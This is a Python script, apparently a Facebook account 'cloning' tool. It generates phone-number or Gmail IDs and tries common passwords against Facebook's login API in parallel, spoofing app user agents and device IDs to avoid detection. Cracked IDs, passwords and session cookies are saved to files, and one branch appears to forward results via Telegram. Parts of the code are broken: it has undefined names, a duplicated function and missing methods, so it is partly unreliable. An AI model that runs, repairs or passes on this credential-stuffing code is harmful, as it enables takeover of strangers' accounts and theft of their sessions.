#Coded By = Mr.SAMI
import os
import sys
import time
import uuid
import json
import string
import random
import requests
from bs4 import BeautifulSoup as sop
from requests.exceptions import ConnectionError as errorN
from concurrent.futures import ThreadPoolExecutor as speedX

e = "\033[0m"
r = "\033[1;31m"
g = "\033[1;32m"
y = "\033[1;33m"
b = "\033[1;34m"
p = "\033[1;35m"
c = "\033[1;36m"
w = "\033[1;37m"


def SAMI():
    fbav_versions = [f"244.{random.randint(0,9)}.{random.randint(0,9)}.{random.randint(0,99)}.{random.randint(100,199)}" for _ in range(10)]
    fbbv_versions = [f"{random.randint(97000000,97999999)}" for _ in range(10)]
    density_values = [random.uniform(2.0, 4.5) for _ in range(10)]
    width_values = [random.choice([800, 1080, 1440]) for _ in range(10)]
    height_values = [random.choice([1920, 2240, 2880]) for _ in range(10)]
    language_codes = ["en_US", "fr_FR", "es_ES", "de_DE", "it_IT"]
    fbrv_versions = [f"{random.randint(36000000,36999999)}" for _ in range(10)]
    manufacturers = ["lge", "samsung", "google", "oneplus", "huawei"]
    brands = ["lge", "samsung", "google", "oneplus", "huawei"]
    device_models = ["LGE", "SM-G991B", "Pixel 6", "OnePlus 9", "Huawei P40"]
    android_versions = ["6.9", "7.0", "8.0", "9.0", "10.0"]
    cpu_architectures = ["armeabi-v7a:armeabi", "armeabi-v8a:armeabi", "x86_64:x86"]

    fbav_version = random.choice(fbav_versions)
    fbbv_version = random.choice(fbbv_versions)
    density = random.choice(density_values)
    width = random.choice(width_values)
    height = random.choice(height_values)
    language_code = random.choice(language_codes)
    fbrv_version = random.choice(fbrv_versions)
    manufacturer = random.choice(manufacturers)
    brand = random.choice(brands)
    device_model = random.choice(device_models)
    android_version = random.choice(android_versions)
    cpu_architecture = random.choice(cpu_architectures)

    user_agent = f"[FBAN/FB4A;FBAV/{fbav_version};FBBV/{fbbv_version};FBDM/{{density={density},width={width},height={height}}};FBLC/{language_code};FBRV/{fbrv_version};FBCR/null;FBMF/{manufacturer};FBBD/{brand};FBPN/com.facebook.katana;FBDV/{device_model};FBSV/{android_version};FBOP/1;FBCA/{cpu_architecture};]"

    return user_agent

# Example


loop = 0
okacc = []
cpacc = []
devices = ["GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820"]



def logo():
    os.system("clear")
    print(banner)

def linex():
    print(f"{w}{50*'═'}")

def x():
    os.system("")

def check_apk(session,coki):
    w = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    app = [i.text for i in x.find_all("h3")]
    if len(app)==0:
        print(f" {w}[!] {g}Active Apps Not Found ")
    else:
        print(f" {w}[!] {g}Active Apps Are Below : ")
        for i in range(len(app)):
            print(f" {w}[{i+1}{w}] {g}{app[i]} ")
    w = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    app = [i.text for i in x.find_all("h3")]
    if len(app)==0:
        print(f" {w}[!] {r}Expired Apps Not Found ")
        linex()
    else:
        print(f" {w}[!] {r}Expired Apps Are Below : ")
        for i in range(len(app)):
            print(f" {w}[{i+1}{w}] {r}{app[i]} ")
        else:
            linex()

        
def main():
    x()
    logo()
    print("\033[1;32m[1] FACEBOOK FILE CLONING ")
    print("\033[1;32m[2] RANDOM CLONING 4 COUNTRY")
    print("\033[1;32m[3] GMAIL RANDOM CLONING ")
    print("\033[1;32m[4] OLD RANDOM CLONING  ")
    print("\033[1;32m[5] FACEBOOK ID AUTO CREAT ")
    print("\033[1;32m[6] EXIT SAMI TOOL")       
    linex()
    SAMI_xd = input(f"SELECT CORRECT OPTION : ")
    if SAMI_xd == "1":
        file_crack()
    elif SAMI_xd == "2":
        random_crack()
    elif SAMI_xd == "3":
        gmail()        
    elif SAMI_xd == "4":
        old()                
    elif SAMI_xd == "5":
        auto()
        main()
    elif SAMI_xd == "6":
        linex()
        print(f"(✓)THANKS FOR USING TOOL ")
        linex()
        sys.exit()
    else:
        linex()
        print(f"(√)SELECTED OPTION invalid ")
        linex()
        time.sleep(1)
        main()

def file_crack():
    logo()
    print("\033[1;37m[•] EXAMPLE : /sdcard/file.txt ")
    linex()
    file = input(f"\033[1;37m[•] ENTER FILE PATH : ")
    try:
        idz = open(file, "r").read().splitlines()
    except FileNotFoundError:
        linex()
        x = "\033[1;37m[•] FILE NOT FOUND"
        print(f" {w}[!] {r}{x} ")
        linex()
        time.sleep(1)
        file_crack()
    logo()
    print("\033[1;37m[1] CRACK WITH AUTO PASS ")
    print("\033[1;37m[2] CRACK WITH MANUAL PASS ")
    linex()
    ptype = input(f"\033[1;37m[•] SELECT : ")
    ps_list = []
    if ptype == "1":
        ps_list.append("first123")
        ps_list.append("first@123")
        ps_list.append("first1234")
        ps_list.append("first12345")
        ps_list.append("firstlast")
        ps_list.append("first last")
        ps_list.append("first@1234")
        ps_list.append("first@12345")
        ps_list.append("freefire")
        ps_list.append("i love you")
        ps_list.append("firstlast123")
        ps_list.append("firstlast@123")        
        ps_list.append("last123")
        ps_list.append("last@123")
        ps_list.append("last1234")
        ps_list.append("first@#")                
    else:
        logo()
        print("\033[1;37m[•] MAXIMUM LIMIT : (10) ")
        linex()
        try:
            ps_limit = int(input(f"\033[1;37m[•] ENTER PASSWORD LIMIT  : "))
        except ValueError:
            ps_limit = 5
        logo()
        print("\033[1;37m[•] EXAMPLE : first123, first1234, first12345 ")
        linex()
        for x in range(ps_limit):
            ask_pw = input(f"\033[1;37m[{SAMI+1}] ENTER PASSWORD : ")
            ps_list.append(ask_pw)
    with speedX(max_workers=55) as file_process:
        logo()
        total_idz = str(len(idz))
        print(f"\033[1;37m[•] TOTAL ACCOUNTS {total_idz} ")
        print("\033[1;37m[•] PROCESS HAS BEEN STARTED ")
        print("\033[1;37m[•] USE FLIGHT MODE FOR MORE OK IDZ ")
        linex()
        for x in idz:
            uid, name = x.split("|")
            pww = ps_list
            file_process.submit(file_method, uid, name, pww, total_idz)
    linex()
    print(f"\033[1;37m[•] PROCESS HAS BEEN COMPLETED ")
    print(f"\033[1;37m[•] TOTAL OK ACCOUNTS{str(len(okacc))} ")
    print(f"\033[1;37m[•] TOTAL CP ACCOUNTS: {r}{str(len(cpacc))} ")
    linex()
    input(f"\033[1;32m[•] PRESS ENTER TO EXIT TOOL ")
    sys.exit()

def random_crack():
    x()
    logo()
    print("\033[1;32m[1] INDIA RANDOM CLONING ")
    print("\033[1;32m[2] PAKISTHAN RANDOM CLONING")
    print("\033[1;32m[3] BANGLADES RANDOM CLONING")
    print("\033[1;32m[4] FREE FIRE PUBG ID CLONING ")
    print("\033[1;32m[5] RONDAM 4 CHOICE PASS CLONING")
    print("\033[1;32m[6] EXIT SAMI TOOL")       
    linex()
    SAMI_xd = input(f"SELECT CORRECT OPTION : ")
    if SAMI_xd == "1":
        SAMI1()
    elif SAMI_xd == "2":
        SAMI2()
    elif SAMI_xd == "3":
        SAMI3()        
    elif SAMI_xd == "4":
        SAMI4()                
    elif SAMI_xd == "5":
        SAMI5()
        random_crack()
    elif SAMI_xd == "6":
        linex()
        print(f"(✓)THANKS FOR USING TOOL ")
        linex()
        sys.exit()
    else:
        linex()
        print(f"(√)SELECTED OPTION invalid ")
        linex()
        time.sleep(1)
        random_crack()
        
def SAMI1():
    logo()
    idz = []
    print('[+] USE YOUR FOUR DIGIT OF SIM NUMBER  9760,9827,9800,9840,9849') 
    linex()
    code = input(f"[•] INPUT CODE: ")
    try:
        limit = int(input(f"[•] ENTER LIMIT CLONE : "))
    except ValueError:
        limit = 5000
    for _ in range(limit):
        idz.append("".join(random.choice(string.digits) for _ in range(6)))
    linex()
    print("[1] METHOD (METHOD1")
    print("[2] METHOD (METHOD2")
    print("[3] METHOD (METHOD3")
    linex()
    m = input(f"(•) SELECT  METHOD : ")
    with speedX(max_workers=55) as random_process:
        logo()
        total_idz = str(len(idz))
        print(f"\033[1;37m[•] TOTAL ACCOUNTS {total_idz} ")
        print("\033[1;37m[•] PROCESS HAS BEEN STARTED ")
        print("\033[1;37m[•] USE FLIGHT MODE FOR MORE OK IDZ ")
        linex()
        for guru in idz:
            uid = code+guru
            mk = uid[:6]
            pww = [uid[:6], uid,mk,"57273200", "59039200", "57575753"]
            if "1" in m:
                random_process.submit(random_method1, uid, pww, total_idz)
            elif "2" in m:
                random_process.submit(random_method2, uid, pww, total_idz)
            elif "3" in m:
                random_process.submit(random_method3, uid, pww, total_idz)
            else:
                random_process.submit(random_method3, uid, pww, total_idz)
    linex()
    print(f"\033[1;37m[•] PROCESS HAS BEEN COMPLETED ")
    print(f"\033[1;37m[•] TOTAL OK ACCOUNTS{str(len(okacc))} ")
    print(f"\033[1;37m[•] TOTAL CP ACCOUNTS: {r}{str(len(cpacc))} ")
    linex()
    input(f"\033[1;32m[•] PRESS ENTER TO EXIT TOOL ")
    sys.exit()

def SAMI2():
    logo()
    idz = []
    print('[+] EXAMPLE SIM NUMBER  92302,92301,92309') 
    linex()
    code = input(f"[•] INPUT CODE: ")
    try:
        limit = int(input(f"[•] ENTER LIMIT CLONE : "))
    except ValueError:
        limit = 5000
    for _ in range(limit):
        idz.append("".join(random.choice(string.digits) for _ in range(6)))
    linex()
    print("[1] METHOD (METHOD1")
    print("[2] METHOD (METHOD2")
    print("[3] METHOD (METHOD3")
    linex()
    m = input(f"(•) SELECT  METHOD : ")
    with speedX(max_workers=55) as random_process:
        logo()
        total_idz = str(len(idz))
        print(f"\033[1;37m[•] TOTAL ACCOUNTS {total_idz} ")
        print("\033[1;37m[•] PROCESS HAS BEEN STARTED ")
        print("\033[1;37m[•] USE FLIGHT MODE FOR MORE OK IDZ ")
        linex()
        for guru in idz:
            uid = code+guru
            pww = [code+guru,'57273200','hindustan','59039200','57575751']
            if "1" in m:
                random_process.submit(random_method1, uid, pww, total_idz)
            elif "2" in m:
                random_process.submit(random_method2, uid, pww, total_idz)
            elif "3" in m:
                random_process.submit(random_method3, uid, pww, total_idz)
            else:
                random_process.submit(random_method3, uid, pww, total_idz)
    linex()
    print(f"\033[1;37m[•] PROCESS HAS BEEN COMPLETED ")
    print(f"\033[1;37m[•] TOTAL OK ACCOUNTS{str(len(okacc))} ")
    print(f"\033[1;37m[•] TOTAL CP ACCOUNTS: {r}{str(len(cpacc))} ")
    linex()
    input(f"\033[1;32m[•] PRESS ENTER TO EXIT TOOL ")
    sys.exit()

def SAMI3():
    logo()
    idz = []
    print('[+] EXAMPLE SIM NUMBER  017,018,019 ') 
    linex()
    code = input(f"[•] INPUT CODE: ")
    try:
        limit = int(input(f"[•] ENTER LIMIT CLONE : "))
    except ValueError:
        limit = 5000
    for _ in range(limit):
        idz.append("".join(random.choice(string.digits) for _ in range(6)))
    linex()
    print("[1] METHOD (METHOD1")
    print("[2] METHOD (METHOD2")
    print("[3] METHOD (METHOD3")
    linex()
    m = input(f"(•) SELECT  METHOD : ")
    with speedX(max_workers=55) as random_process:
        logo()
        total_idz = str(len(idz))
        print(f"\033[1;37m[•] TOTAL ACCOUNTS {total_idz} ")
        print("\033[1;37m[•] PROCESS HAS BEEN STARTED ")
        print("\033[1;37m[•] USE FLIGHT MODE FOR MORE OK IDZ ")
        linex()
        for guru in idz:
            uid = code+guru
            mk = uid[:6]
            pww = [uid[:6], uid,mk,"57273200", "59039200", "57575753"]
            if "1" in m:
                random_process.submit(random_method1, uid, pww, total_idz)
            elif "2" in m:
                random_process.submit(random_method2, uid, pww, total_idz)
            elif "3" in m:
                random_process.submit(random_method3, uid, pww, total_idz)
            else:
                random_process.submit(random_method3, uid, pww, total_idz)
    linex()
    print(f"\033[1;37m[•] PROCESS HAS BEEN COMPLETED ")
    print(f"\033[1;37m[•] TOTAL OK ACCOUNTS{str(len(okacc))} ")
    print(f"\033[1;37m[•] TOTAL CP ACCOUNTS: {r}{str(len(cpacc))} ")
    linex()
    input(f"\033[1;32m[•] PRESS ENTER TO EXIT TOOL ")
    sys.exit()

def SAMI4():
    logo()
    idz = []
    print('[+] USE YOUR FOUR DIGIT OF SIM NUMBER  9760,9827,9800,9840,9849') 
    linex()
    code = input(f"[•] INPUT CODE: ")
    try:
        limit = int(input(f"[•] ENTER LIMIT CLONE : "))
    except ValueError:
        limit = 5000
    for _ in range(limit):
        idz.append("".join(random.choice(string.digits) for _ in range(6)))
    linex()
    print("[1] METHOD (METHOD1")
    print("[2] METHOD (METHOD2")
    print("[3] METHOD (METHOD3")
    linex()
    m = input(f"(•) SELECT  METHOD : ")
    with speedX(max_workers=55) as random_process:
        logo()
        total_idz = str(len(idz))
        print(f"\033[1;37m[•] TOTAL ACCOUNTS {total_idz} ")
        print("\033[1;37m[•] PROCESS HAS BEEN STARTED ")
        print("\033[1;37m[•] USE FLIGHT MODE FOR MORE OK IDZ ")
        linex()
        for guru in idz:
            uid = code+guru
            mk = uid[:6]
            pww = [uid[:6], uid,mk,"57273200", "59039200", "57575753"]
            if "1" in m:
                random_process.submit(random_method1, uid, pww, total_idz)
            elif "2" in m:
                random_process.submit(random_method2, uid, pww, total_idz)
            elif "3" in m:
                random_process.submit(random_method3, uid, pww, total_idz)
            else:
                random_process.submit(random_method3, uid, pww, total_idz)
    linex()
    print(f"\033[1;37m[•] PROCESS HAS BEEN COMPLETED ")
    print(f"\033[1;37m[•] TOTAL OK ACCOUNTS{str(len(okacc))} ")
    print(f"\033[1;37m[•] TOTAL CP ACCOUNTS: {r}{str(len(cpacc))} ")
    linex()
    input(f"\033[1;32m[•] PRESS ENTER TO EXIT TOOL ")
    sys.exit()

def old():
    logo()
    idz = []
    print(f"(√)EXAMPLE PASSWORD 123456 , 1234567,1234567")
    linex()
    code = input(f"(•)ENTER CODE  : ")
    try:
        limit = int(input(f"(•)EMTER LIMT 50000 10000  : "))
    except ValueError:
        limit = 5000
    for _ in range(limit):
        idz.append("".join(random.choice(string.digits) for _ in range(10)))
    linex()
    print("[1] METHOD (METHOD1")
    print("[2] METHOD (METHOD2")
    print("[3] METHOD (METHOD3")
    linex()
    m = input(f"(•) SELECT  METHOD : ")
    with speedX(max_workers=55) as random_process:
        logo()
        total_idz = str(len(idz))
        print(f"\033[1;37m[•] TOTAL ACCOUNTS {total_idz} ")
        print("\033[1;37m[•] PROCESS HAS BEEN STARTED ")
        print("\033[1;37m[•] USE FLIGHT MODE FOR MORE OK IDZ ")
        linex()
        for love in idz:
            uid = code+love
            pww = ["123456","1234567","12345678","123456789","123123"]
            if "1" in m:
                random_process.submit(random_method01, uid, pww, total_idz)
            elif "2" in m:
                random_process.submit(random_method01, uid, pww, total_idz)
            elif "3" in m:
                random_process.submit(random_method01, uid, pww, total_idz)
            else:
                random_process.submit(random_method01, uid, pww, total_idz)
    linex()
    print(f"\033[1;37m[•] PROCESS HAS BEEN COMPLETED ")
    print(f"\033[1;37m[•] TOTAL OK ACCOUNTS{str(len(okacc))} ")
    print(f"\033[1;37m[•] TOTAL CP ACCOUNTS: {r}{str(len(cpacc))} ")
    linex()
    input(f"\033[1;32m[•] PRESS ENTER TO EXIT TOOL ")
    sys.exit()

def gmail():
    logo()
    idz = []
    logo()
    print(f"[√]First : sami, Aarushi, honey ")
    print("[√] Last  : rajput, Kumar, khan ")
    logo()
    linex()
    
    code = input(f"[+] CHOSE FIRST NAME  : ")
    os.system("clear")
    logo()
    code2 = input(f"[+] CHOSE LAST  NAME : ")
    logo()
    print('[√] Domain : @gmail.com, @yahoo.com, @hotmail.com ')
    logo()
    os.system("clear")
    logo()
    domin = input(f"[•] COPY  @gmail.com , etc : ")
    os.system("clear")
    logo()
    try:
        limit = int(input(f"[√] INTER  LIMT: "))
    except ValueError:
        limit = 5000
    for _ in range(limit):
        idz.append("".join(random.choice(string.digits) for _ in range(1,4)))
    linex()
    logo()
    print("[1] METHOD (METHOD1")
    print("[2] METHOD (METHOD2")
    print("[3] METHOD (METHOD3")
    linex()
    logo()
    m = input(f"(•) SELECT  METHOD : ")
    with speedX(max_workers=55) as random_process:
        logo()
        total_idz = str(len(idz))
        print(f"\033[1;37m[•] TOTAL ACCOUNTS {total_idz} ")
        print("\033[1;37m[•] PROCESS HAS BEEN STARTED ")
        print("\033[1;37m[•] USE FLIGHT MODE FOR MORE OK IDZ ")
        linex()
        for love in idz:
            uid = code+code2+love+domin
            pww = [code,code2,code+code2,code+'123',code+'@123',code+'1234',code+'12345',code2+'123',code2+'1234',code2+'12345']
            if "1" in m:
                random_process.submit(random_method1, uid, pww, total_idz)
            elif "2" in m:
                random_process.submit(random_method2, uid, pww, total_idz)
            elif "3" in m:
                random_process.submit(random_method3, uid, pww, total_idz)
            else:
                random_process.submit(random_method3, uid, pww, total_idz)
    linex()
    print(f"\033[1;37m[•] PROCESS HAS BEEN COMPLETED ")
    print(f"\033[1;37m[•] TOTAL OK ACCOUNTS{str(len(okacc))} ")
    print(f"\033[1;37m[•] TOTAL CP ACCOUNTS: {r}{str(len(cpacc))} ")
    linex()
    input(f"\033[1;32m[•] PRESS ENTER TO EXIT TOOL ")
    sys.exit()   
def file_method(uid, name, pww, total_idz):
    global loop
    global okacc
    global cpacc
    sys.stdout.write(f"\r {w}[SAMI- FILE] [{loop}/{total_idz}] [OK/{len(okacc)}]\r"),
    sys.stdout.flush()
    try:
        first = name.split(" ")[0]
        try:
            last = name.split(" ")[1]
        except:
            last = "khan"
        for pw in pww:
            ps = pw.replace("first", first).replace("last", last).replace("name", name).lower()
            ua_string = "Dalvik/2.1.0 (Linux; U; Android 12; M2101K6G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36 [FBAN/FB4A;FBAV/344.0.0.0.120;FBBV/278111111;FBDM/{density=2.75,width=1080,height=2400};FBLC/en_US;FBMF/xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2101K6G;FBSV/12;FBOP/1;FBCA/arm64-v8a]"
            secure = str(uuid.uuid4())
            data = {
                'adid': secure,
                'format': 'json',
                'device_id': secure,
                'email': uid,
                'password': ps,
                'generate_analytics_claims': '1',
                'community_id': '',
                'cpl': 'true',
                'try_num': '1',
                'family_device_id': secure,
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'currently_logged_in_userid': '0',
                'locale': 'en_GB',
                'client_country_code': 'GB',
                'fb_api_req_friendly_name': 'authenticate',
                'api_key': '882a8490361da98702bf97a021ddc14d',
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            }
            headers = {
            'User-Agent': user_agent,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'X-Tigon-Is-Retry': 'False',
            'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'X-fb-device-group': '5120',
            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags': 'graphservice',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
            url = "https://b-graph.facebook.com/auth/login"
            data_json = requests.post(url, data=data, headers=headers).json()
            if "session_key" in data_json:
                coki = ";".join(i["name"]+"="+i["value"] for i in data_json["session_cookies"])
                print(f" {g}[SAMI-OK] {uid} | {ps}")
                print(f" {w}[Cookies] > {g}{coki} ")
                open("/sdcard/SAMI-FILE-OK.txt", "a").write(f"{uid}|{ps}|{coki}\n")
                okacc.append(uid)
                break
            elif "www.facebook.com" in data_json["error"]["message"]:
                print(f" {r}[SAMI-CP] {uid} | {ps}")
                open("/sdcard/SAMI-FILE-CP.txt", "a").write(f"{uid}|{ps}\n")
                cpacc.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        time.sleep(10)


def random_method1(uid, pww, total_idz):
    global loop
    global okacc
    global cpacc
    sys.stdout.write(f"\r {w}[SAMI-M1] [{loop}/{total_idz}] [OK/{len(okacc)}]\r"),
    sys.stdout.flush()
    try:
        for pw in pww:
            session = requests.Session()
            device = random.choice(devices)
            secure = str(uuid.uuid4())
            ua_string = "Dalvik/2.1.0 (Linux; U; Android 11.0.0; SM-A205F Build/RP1A.200720.012) [FBAN/FB4A;FBAV/303.13.73.7;FBBV/90347606;FBDM={density=2.0,width=864,height=1776};FBLC/en_US;FBRV/19820818;FBCR/null;FBMF/Samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Galaxy;FBSV/11.6;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
            data = {
                'adid':secure,
                'format':'json',
                'device':device,
                'device_id':secure,
                'email':uid,
                'password':pw,
                "logged_out_id": secure,
                "hash_id": secure,
                "reg_instance": secure,
                "session_id": secure,
                "advertiser_id": secure,
                'generate_analytics_claims':'1',
                'credentials_type':'password',
                'source':'login',
                "sim_country": "id",
                "network_country": "id",
                "relative_url": "method/auth.login",
                'error_detail_type':'button_with_disabled',
                'enroll_misauth':'false',
                'generate_session_cookies':'1',
                'generate_machine_id':'1',
                "locale":"en_US","client_country_code":"US",
                'fb_api_req_friendly_name':'authenticate',
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            }
            accessToken="350685531728|62f8ce9f74b12f84c123cc23437a4a32"
            headers = {
                'Authorization':f'OAuth {accessToken}',
                "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                'X-FB-Friendly-Name':'authenticate',
                'X-FB-Connection-Type':'unknown',
                'User-Agent':SAMI(),
                'Accept-Encoding':'gzip, deflate',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger',
            }
            url = "https://b-graph.facebook.com/auth/login"
            data_json = session.post(url, data=data, headers=headers).json()
            if "session_key" in data_json:
                try:
                    uid = data_json["uid"]
                except:
                    uid = uid
                coki = ";".join(i["name"]+"="+i["value"] for i in data_json["session_cookies"])
                print(f" {g}[SAMI-OK] {uid} | {pw}")
                print(f" {w}[Cookies] > {g}{coki} ")
                open("/sdcard/SAMI-OK.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                okacc.append(uid)
                check_apk(session,coki)
                break
            elif "www.facebook.com" in data_json["error"]["message"]:
                try:
                    uid = data_json["error"]["error_data"]["uid"]
                except:
                    uid = uid
                print(f" {p}[SAMI-CP] {uid} | {pw}")
                open("/sdcard/SAMI-CP.txt", "a").write(f"{uid}|{pw}\n")
                cpacc.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        time.sleep(10)

def random_method1(uid, pww, total_idz):
    global loop
    global okacc
    global cpacc
    sys.stdout.write(f"\r {w}[SAMI-OLD] [{loop}/{total_idz}] [OK/{len(okacc)}]\r"),
    sys.stdout.flush()
    try:
        for pw in pww:
            session = requests.Session()
            ua = "Dalvik/2.1.0 (Linux; U; Android 11.0.0; SM-A205F Build/RP1A.200720.012) [FBAN/FB4A;FBAV/303.13.73.7;FBBV/90347606;FBDM={density=2.0,width=864,height=1776};FBLC/en_US;FBRV/19820818;FBCR/null;FBMF/Samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Galaxy;FBSV/11.6;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
            secure = str(uuid.uuid4())
            data = {
                'adid': secure,
                'format': 'json',
                'device_id': secure,
                'email': uid,
                'password': pw,
                'generate_analytics_claims': '1',
                'community_id': '',
                'cpl': 'true',
                'try_num': '1',
                'family_device_id': secure,
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'fb_api_req_friendly_name': 'authenticate',
                'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            }
            headers = {'User-Agent': SAMI(),
            'Content-Type': 'application/x-www-form-urlencoded', 
            'Host': 'graph.facebook.com', 
            'X-FB-Net-HNI': '25227',
            'X-FB-SIM-HNI': '29752',
            'X-FB-Connection-Type': 'MOBILE.LTE', 
            'X-Tigon-Is-Retry': 'False', 
            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 
            'x-fb-device-group': '5120', 
            'X-FB-Friendly-Name': 'ViewerReactionsMutation', 
            'X-FB-Request-Analytics-Tags': 'graphservice', 
            'X-FB-HTTP-Engine': 'Liger', 
            'X-FB-Client-IP': 'True', 
            'X-FB-Server-Cluster': 'True', 
            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 
            'Content-Length': '706'}
            url = "https://b-graph.facebook.com/auth/login"
            data_json = session.post(url, data=data, headers=headers).json()
            if "session_key" in data_json:
                try:
                    uid = data_json["uid"]
                except:
                    uid = uid
                coki = ";".join(i["name"]+"="+i["value"] for i in data_json["session_cookies"])
                print(f" {g}[SAMI-OK] {uid} | {pw}")                
                print(f" {w}[Cookies] > {g}{coki} ")                
                open("/sdcard/SAMI-OK.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                okacc.append(uid)
                break
            elif "www.facebook.com" in data_json["error"]["message"]:
                try:
                    uid = data_json["error"]["error_data"]["uid"]
                except:
                    uid = uid
                print(f" {p}[SAMI-CP] {uid} | {pw}")
                open("/sdcard/SAMI-CP.txt", "a").write(f"{uid}|{pw}\n")                
                send_telegram_message(telegram_token, telegram_chat_id, msg)
                cpacc.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        time.sleep(10)
import os,sys,re,time,json
import requests,bs4,string
import faker,fake_email,random
